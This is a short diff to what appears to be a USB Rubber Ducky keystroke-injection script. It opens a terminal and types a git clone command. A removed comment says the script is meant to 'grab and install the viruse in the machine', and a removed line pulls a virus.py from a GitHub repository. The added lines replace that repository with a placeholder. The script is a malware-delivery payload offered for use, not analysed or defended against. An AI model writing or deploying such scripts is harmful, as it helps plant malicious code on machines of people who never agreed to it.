@@ -1,5 +1,7 @@
-REM install this ducky script in the usb, This will be used to grab and install the viruse in the machine
 GUI
 STRING terminal
 ENTER
-Git clone https://github.com/RaziFalah/DuckyScripts/virus.py
+ENTER
+delay 500
+STRING Git clone <Your-repo>
+enter
